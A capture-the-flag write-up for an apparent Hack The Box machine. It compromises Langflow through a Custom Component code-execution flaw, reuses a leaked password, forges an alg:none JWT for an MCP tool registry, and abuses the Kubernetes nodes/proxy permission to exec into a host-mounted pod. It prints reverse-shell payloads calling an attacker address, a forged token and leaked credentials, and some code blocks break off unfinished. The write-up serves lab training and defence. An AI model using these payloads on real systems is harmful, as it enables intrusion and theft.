Langflow 1.8.2 reachable through a wildcard subdomain (`flow.fireflow.htb`) is vulnerable to **CVE-2026-33017** (GHSA-vwmf-pq79-vjvx), allowing arbitrary Python execution via a crafted Custom Component flow and yielding a reverse shell as `www-data`. The Langflow service environment leaks `LANGFLOW_SUPERUSER_PASSWORD`, which is reused as the OS password for the user `nightfall`. Privilege escalation is the interesting half: an internal MCP server running on a Kubernetes node accepts JWTs with `alg: none`, allowing a forged admin token; registering a tool with arbitrary Python code yields RCE inside the MCP pod; the pod's service-account token holds `get` on `nodes/proxy`, which is abused to reach the kubelet API on port 10250 directly; from there, the `/exec` WebSocket endpoint is used to run commands inside the host-mounted Prometheus node-exporter pod, reading `/root/root.txt` on the underlying node as root.

**Langflow 1.8.2**. Langflow is an open-source visual builder for LLM agent workflows; flows are JSON documents describing a graph of components (LLM nodes, prompt templates, retrievers, custom code blocks). The relevant fact for an attacker is that Langflow supports **Custom Components** — flow nodes whose `code` field contains Python source that Langflow compiles and executes server-side when the flow runs. Versions ≤1.8.2 expose this functionality on flow endpoints with insufficient sandboxing, which is the substance of **CVE-2026-33017** (GHSA-vwmf-pq79-vjvx).

## Exploitation — CVE-2026-33017 (Langflow Custom Component RCE)

### Understanding the Vulnerability

The Langflow data model represents each component as a JSON object with a `template` containing a `code` field. When a flow is executed, the server reads each node's `code` field, dynamically compiles it as Python (essentially `exec()`), and instantiates the resulting class. Anything the Python code does as a side effect of being compiled and instantiated — imports, function calls at module scope, constructor logic — runs server-side with the privileges of the Langflow process (`www-data` here).

The vulnerability is that the public-facing flow execution endpoint (`/api/v1/flows/public_flow/<UUID>`-adjacent paths) doesn't require authentication, but does allow the requester to **submit their own flow definition** — overriding the saved flow's components with attacker-supplied ones. The combination — unauthenticated control over what code gets executed — is direct RCE.

### Crafting the Payload

The vulnerable Custom Component just needs to define a subclass of `lfx.custom.custom_component.component.Component` with the expected interface. Any code outside the class — including module-level imports and side-effect calls — runs at compile/import time. A reverse-shell one-liner wrapped in `os.popen()` at module scope is therefore sufficient:

```python
import os

_proof = os.popen("bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'").read().strip()

from lfx.custom.custom_component.component import Component
from lfx.io import Output
from lfx.schema.data import Data

class ExploitComp(Component):
    display_name = "X"
    outputs = [Output(display_name="O", name="o", method="r")]
    def r(self) -> Data:
        return Data(data={})
```

The shell connects back before the rest of the module even finishes loading — `os.popen()` blocks until the bash subprocess exits, and bash with `-i` running over `/dev/tcp/...` blocks for the lifetime of the connection. Langflow ends up waiting on the import, but by then we already have the shell.

Wrapped inside the full Langflow flow JSON expected by the endpoint:

```json
{
  "data": {
    "nodes": [{
      "id": "Exploit-001",
      "type": "genericNode",
      "data": {
        "id": "Exploit-001",
        "type": "ExploitComp",
        "node": {
          "template": {
            "code": {
              "type": "code",
              "value": "import os\n\n_proof = os.popen(\"bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'\").read().strip()\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n    display_name=\"X\"\n    outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n    def r(self)->Data:\n        return Data(data={})",

```

## Lateral Movement — `www-data` → `nightfall`

### Environment Variable Disclosure

A reflex check after any shell is `env`, because services running under systemd routinely receive credentials through environment variables defined in the unit file or its `EnvironmentFile=` drop-in:

```bash
env
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
LANGFLOW_CORS_ORIGINS=https://flow.fireflow.htb,https://fireflow.htb
[...]
```

The `LANGFLOW_SUPERUSER_PASSWORD` is the Langflow application's admin password — not an OS password by design. But the value (`n1ghtm4r3_b4_n1ghtf4ll`) has the wordplay-ish structure of a password an operator chose for themselves, not a random secret a deployment system generated. And there's a system user on the box whose name happens to be a substring of that password:

```bash
cat /etc/passwd | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
nightfall:x:1000:1000::/home/nightfall:/bin/bash
```

`nightfall` is the only non-root user with a login shell, and the password literally contains the word *nightfall*. Trying the reuse:

```bash
ssh nightfall@fireflow.htb
nightfall@fireflow.htb's password: n1ghtm4r3_b4_n1ghtf4ll
nightfall@fireflow:~$ cat user.txt
```

This is the foothold proper. Credential reuse between an application's superuser and an OS account is the same recurring pattern from previous engagements — an operator chooses a password, sets it on the application, and reuses it for SSH because remembering two passwords is harder.

## Privilege Escalation — `nightfall` → `root` (via the Kubernetes Cluster)

The standard privesc enumeration as `nightfall` produced nothing obvious — no sudo entries, no SUID anomalies, no writable cron-touched files. The breakthrough came from realising the box runs a small Kubernetes cluster (k3s), and the actual privesc lives entirely on that side.

### MCP API Enumeration

Hitting the version endpoint with no auth:

```bash
curl http://10.43.250.195:8080/api/v1/version
{
  "service": "MCP AI Tool Registry",
  "version": "0.1.0",
  "auth": {
    "type": "JWT",
    "header": "Authorization: Bearer <token>",
    "supported_algorithms": ["HS256", "none"]
  },
  "docs": "/docs",
  "endpoints": [
    "POST /mcp                        [MCP JSON-RPC 2.0]",
    "POST /api/v1/auth",
    "GET  /api/v1/tools",
    "POST /api/v1/tools               [admin]"
  ]
}
```

The version response is its own vulnerability disclosure. `"supported_algorithms": ["HS256", "none"]` is the textbook JWT misconfiguration — the server documents that it will accept **unsigned tokens** as valid. Combined with role-based admin gating (`POST /api/v1/tools [admin]`), this is a one-step privilege bypass: any caller can forge an `alg:none` token with `role: admin` and access the admin endpoint.

The OpenAPI schema fetched from `/openapi.json` confirmed the request shapes:

- `POST /api/v1/auth` → `{username, password}` → returns access token.
- `GET /api/v1/tools` → lists registered tools.
- `POST /api/v1/tools` → `{name, description, code, inputSchema}` → admin-only, **registers a new tool with arbitrary Python in `code`**.
- `POST /mcp` → MCP JSON-RPC endpoint, used to invoke registered tools.

The shape of `POST /api/v1/tools` is the privesc primitive: the field literally named `code` accepts arbitrary Python that gets executed when the tool runs. The only thing in the way is the `[admin]` gate.

### JWT Forgery via `alg: none`

The standard way to start was authenticating with the discovered credentials:

```bash
curl -X POST http://10.43.250.195:8080/api/v1/auth \
     -H "Content-Type: application/json" \
     -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}'
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps","token_type":"bearer"}
```

Decoding the token on jwt.io revealed the structure:

![jwt.io showing HS256 token with role=user](/assets/img/HTB/Fireflow/cap4.png)

```text
Header  : { "alg": "HS256", "typ": "JWT" }
Payload : { "sub": "langflow-bot", "role": "user" }
```

Testing the role gate with this user-role token:

```bash
token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps"
curl -X POST http://10.43.250.195:8080/api/v1/tools \
     -H 'Content-Type: application/json' \
     -H "Authorization: Bearer $token" \
     -d '{"ping_host":"127.0.0.1"}'
{"detail":"Admin role required"}
```

Confirmed gate. Now the forgery: change the header to `alg: none`, change the payload role to `admin`, and produce a token whose third segment (the signature) is empty.

![jwt.io showing forged alg:none admin token](/assets/img/HTB/Fireflow/cap5.png)

```text
Header  : { "alg": "none", "typ": "JWT" }
Payload : { "sub": "admin", "role": "admin" }
Token   : eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
```

Note the trailing `.` — the signature segment exists but is empty, which is what `alg: none` requires. A JWT library that respects this algorithm value will skip signature verification entirely:

```bash
priv_token="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."
curl -X POST http://10.43.250.195:8080/api/v1/tools \
     -H 'Content-Type: application/json' \
     -H "Authorization: Bearer $priv_token" \
     -d '{"ping_host":"127.0.0.1"}'
{"detail":[{"type":"missing","loc":["body","name"],"msg":"Field required"...}]}
```

The 422 error means **the role gate is gone** — the server got past auth and is now complaining about missing body fields. The bypass works.

### Tool Registration RCE — Detaching from the HTTP Handler

The `POST /api/v1/tools` payload accepts a Python `code` field that gets executed when the tool runs. The naïve thing is to stuff `os.system("bash -c 'bash -i >& /dev/tcp/...'")` in there, but that has a subtle failure mode: the HTTP request handler that processes the registration (or the MCP call that invokes the tool) tears down its process tree when the response returns, which kills any child processes it spawned. The reverse shell dies almost immediately.

The fix is to **detach** the child process from the handler's lifecycle. In Python, the clean way is `subprocess.Popen([...], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)` — once `Popen` returns, the child is a fully independent process and the parent can die without affecting it. To upgrade the child to a TTY, the child itself runs a small Python harness that calls `pty.spawn` after connecting:

```python
import subprocess, os, sys
subprocess.Popen([
    "python3", "-c",
    "import socket,subprocess,os,pty;"
    "s=socket.socket();"
    "s.connect((\"<ATTACKER_IP>\",5555));"
    "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
    "pty.spawn(\"/bin/bash\")"
], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
print("shell spawned")
```

Registering this as a tool via the privileged forged token:

```bash
curl -X POST http://10.43.250.195:8080/api/v1/tools \
     -H 'Content-Type: application/json' \
     -H "Authorization: Bearer $priv_token" \
     -d '{
       "name": "pwn2",
       "description": "x",
       "inputSchema": {},
       "code": "import subprocess,os,sys;subprocess.Popen([\"python3\",\"-c\",\"import socket,subprocess,os,pty;s=socket.socket();s.connect((\\\"<ATTACKER_IP>\\\",5555));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\\"/bin/bash\\\")\"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL);print(\"shell spawned\")"
     }'
{"status":"registered","name":"pwn2"}
```

And the tool was invoked through the MCP JSON-RPC endpoint:

### Service Account Token Extraction

Every Kubernetes pod gets a **service account token** mounted as a file under a well-known path inside the container. This is the pod's identity to the Kubernetes API server — a JWT signed by the cluster's internal CA that other components (including the API server itself) accept as proof of which service account is making a request:

```bash
ls /run/secrets/kubernetes.io/serviceaccount/
ca.crt  namespace  token
cat /run/secrets/kubernetes.io/serviceaccount/token
eyJhbGciOiJSUzI1NiIsImtpZCI6ImFQRTZ5R3JrSUpadmdid19HcHBTRTBYUFJZWUxqeGcxUHJIaFJjTEVSdm8ifQ.eyJhdWQiOlsi[...truncated]
```

The token, saved into `new_token` for subsequent use, is what subsequent Kubernetes API calls will authenticate as.

Decoding the token reveals which service account it belongs to and — crucially — which **node** the pod is running on:

### Why `nodes/proxy` Is Catastrophic

The `proxy` subresource on Kubernetes resources is a transparent HTTP forward. When you `GET /api/v1/nodes/<node>/proxy/<path>`, the API server proxies the request to the **kubelet** on that node and returns its response verbatim. The kubelet is the agent running on every Kubernetes node that manages pods on behalf of the API server — it has root-equivalent control over everything on that node, including the ability to start, stop, and **exec into** any pod.

The critical fact: **the kubelet does not enforce Kubernetes RBAC**. RBAC is enforced by the API server; once a request reaches the kubelet (which is what `nodes/proxy` does), the kubelet trusts whoever the API server forwarded the request from. That means a `get nodes/proxy` permission — which sounds modest, like "view node status" — actually grants the **full capabilities of the kubelet API**, including:

- `GET /pods` → list every pod running on the node, including which namespaces they belong to and what they're mounting.
- `POST /exec/<namespace>/<pod>/<container>` → execute arbitrary commands in any pod.
- `GET /logs/<namespace>/<pod>` → read every pod's logs.

The minimum-viable kubelet RCE is therefore:

1. List pods on the node via `nodes/proxy/pods`.
2. Identify a pod that mounts host-level resources or runs with privileged capabilities.
3. Exec into that pod via `nodes/proxy/exec/...` (proxied to the kubelet's own `/exec` endpoint on port 10250).

The standout is **`prometheus-prometheus-node-exporter-nmntq`**. The Prometheus node-exporter exists specifically to collect host-level metrics — CPU, memory, disk, network, filesystem usage. To do that job, the Helm chart's default deployment mounts the host's root filesystem at `/host/root` inside the container and runs the pod **as root with `hostPID: true`**. The container is, by design, an unrestricted reader of the underlying host filesystem.

From inside that pod, **`/host/root/root/root.txt` is literally the host's `/root/root.txt`**.

### Kubelet `/exec` via WebSocket

The final hop is invoking the kubelet's `/exec` endpoint to run a command inside the node-exporter pod. The kubelet listens on port 10250 with TLS; the `/exec` endpoint upgrades the connection to a WebSocket using the **`v4.channel.k8s.io`** subprotocol, which multiplexes stdin/stdout/stderr/resize on a single channel. This is the same mechanism `kubectl exec` uses under the hood — the difference is that we're going to invoke it directly with a service-account bearer token instead of through `kubectl`.

`curl` doesn't speak WebSockets cleanly. **`websocat`** is the right tool — it's basically `curl` for `ws://` and `wss://`, with explicit support for setting subprotocols.

A `whoami` first, to confirm the path works and that we're root inside the target pod:

```bash
websocat --insecure \
         --header "Authorization: Bearer $new_token" \
         --protocol v4.channel.k8s.io \
         "wss://10.129.32.226:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?output=1&error=1&command=whoami"
root
```

`root` inside the node-exporter pod, which (thanks to the host mount) is also root over `/host/root/*` — the host's filesystem. The final exec reads the host's root flag:

```bash
websocat --insecure \
         --header "Authorization: Bearer $new_token" \
         --protocol v4.channel.k8s.io \
         "wss://10.129.32.226:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?output=1&error=1&command=cat&command=/host/root/root/root.txt"
```

The URL-parameter conventions for `/exec` are worth noting: `command=` may be repeated to pass multiple argv tokens (`cat /host/root/root/root.txt` becomes `&command=cat&command=/host/root/root/root.txt`), `output=1` and `error=1` enable stdout and stderr multiplexing.

## Key Takeaways

- **Wildcard TLS certificates pre-disclose subdomains.** A SAN like `*.fireflow.htb` doesn't just permit any subdomain at runtime; it tells an attacker the operator expected to use multiple subdomains. Together with the "Open Agent" UI hint, that wildcard was the entire path to `flow.fireflow.htb` without any DNS brute-forcing required.
- **Any `code` field in a public API is RCE.** Langflow's Custom Component design is a tool for power users to extend functionality with Python. Exposed without strict authentication boundaries, it is *also* a tool for unauthenticated attackers to do the same thing. CVE-2026-33017 is the predictable consequence — and the same anti-pattern shows up in the MCP server's `POST /api/v1/tools` endpoint later in the chain.
- **JWT `alg:none` is a documented design mistake.** Any JWT library that defaults to honouring the `alg` header — including the `none` value — is broken by design. A correctly-configured server hardcodes the expected algorithm and rejects everything else. A library that advertises `"supported_algorithms": ["HS256", "none"]` as a feature is telling attackers the bypass is ready.
- **Application environment variables leak credentials reliably.** Both the Langflow service environment (which leaked the OS password for `nightfall`) and the MCP service environment (which exposed the full Kubernetes pod context) gave critical information for free. `cat /proc/<pid>/environ | tr '\0' '\n'` should be a reflex on any post-exploitation shell.
- **Service-account tokens are the foothold currency of Kubernetes.** Any pod compromise yields a JWT mounted at `/run/secrets/kubernetes.io/serviceaccount/token` — that JWT is the pod's identity to the entire cluster, and its capabilities are determined entirely by RBAC bindings the cluster admin set up. `SelfSubjectRulesReview` is the first thing to query: it answers "what can this token do?" definitively, without trial and error.
- **`nodes/proxy` is the most dangerous narrowly-scoped Kubernetes permission.** It looks innocuous on a binding because the verb is `get` and the resource sounds informational. In practice it grants the full kubelet API surface — pod listing, log reading, and **arbitrary command execution inside any pod the kubelet manages**. RBAC bindings that mention `nodes/proxy` should be treated as equivalent to cluster-admin from a node-takeover perspective.
- **Privileged monitoring pods are the universal lateral target.** Prometheus node-exporter, Datadog agents, Splunk forwarders, Falco — anything whose job is to observe host-level state needs host-level access. The Helm chart defaults for these tools mount the root filesystem and run as root, which makes them the most powerful pod on the cluster from an attacker's perspective. Any RBAC permission that lets you `exec` into pods on a node implicitly grants root on that node *if* a monitoring pod is scheduled there.
- **Detaching child processes is the difference between a working RCE and a flaky one.** Code-execution channels gated by short-lived HTTP handlers (Lambda, FastAPI request scopes, JSON-RPC handlers) tear down their process trees aggressively. The discipline of always wrapping post-RCE payloads in `subprocess.Popen(..., stdout=DEVNULL, stderr=DEVNULL)` or `nohup` + `&` saves debugging time across many engagements.
